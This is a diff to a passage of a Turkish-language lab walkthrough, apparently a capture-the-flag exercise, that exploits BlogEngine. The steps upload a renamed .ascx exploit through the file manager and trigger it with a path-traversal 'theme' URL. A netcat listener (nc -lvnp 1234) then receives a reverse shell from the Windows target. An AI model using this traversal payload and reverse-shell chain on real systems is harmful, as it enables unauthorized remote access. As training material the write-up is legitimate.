@@ -67,15 +67,15 @@ Exploit'te yerel IP adresi ve port değiştiriyorum
 Exploit ismini PostView.ascx olarak değiştiriyorum 
 Exploit, BlogEngine dosya yöneticisi aracılığıyla yüklüyorum
 Kali ana bilgisayarında netcat dinleyicisini başlatıyorum
-http://10.10.79.198/?theme=../../App_Data/files ve en son bu adrese gidiyorum
+http://10.10.182.80/?theme=../../App_Data/files ve en son bu adrese gidiyorum
 
 nc -lvnp 1234
 
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
 Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 10.10.79.198.
-Ncat: Connection from 10.10.79.198:56475.
+Ncat: Connection from 10.10.182.80.
+Ncat: Connection from 10.10.182.80:56475.
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 c:\windows\system32\inetsrv>whoami
